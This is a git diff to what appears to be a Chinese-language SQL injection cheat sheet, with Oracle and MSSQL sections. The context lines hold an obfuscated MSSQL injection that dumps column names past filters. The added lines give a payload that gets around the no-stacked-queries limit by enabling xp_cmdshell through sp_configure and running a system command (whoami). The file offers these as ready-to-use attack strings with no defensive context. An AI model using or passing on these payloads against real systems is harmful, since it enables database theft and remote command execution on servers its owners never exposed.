@@ -316,7 +316,12 @@ file_name(@@version)
 ```
 '%1eaND%1e1=(SelEct/*xxxxxxxxxxxx*/%1equotename/**/(name)%1efRom 数据库名%0f..syscolumns%1ewHerE%1eid=(selEct/*xxxxxxxxx*/%1eid%1efrom%1e数据库名%0f..sysobjects%1ewHerE%1ename='表名')%1efoR%1eXML%1ePATH/**/(''))%1e-
 ```
-
+- MSSQL注入 突破不能堆叠的限制执行系统命令
+```
+select 1 where 1=1 (闭合) if 1=1 execute('exec sp_configure ''show advanced options'',
+1;reconfigure;exec sp_configure ''xp_cmdshell'', 1;reconfigure;exec xp_cmdshell
+''whoami'''--+
+```
 ### oracle注入
 
 #### oracle联合查询
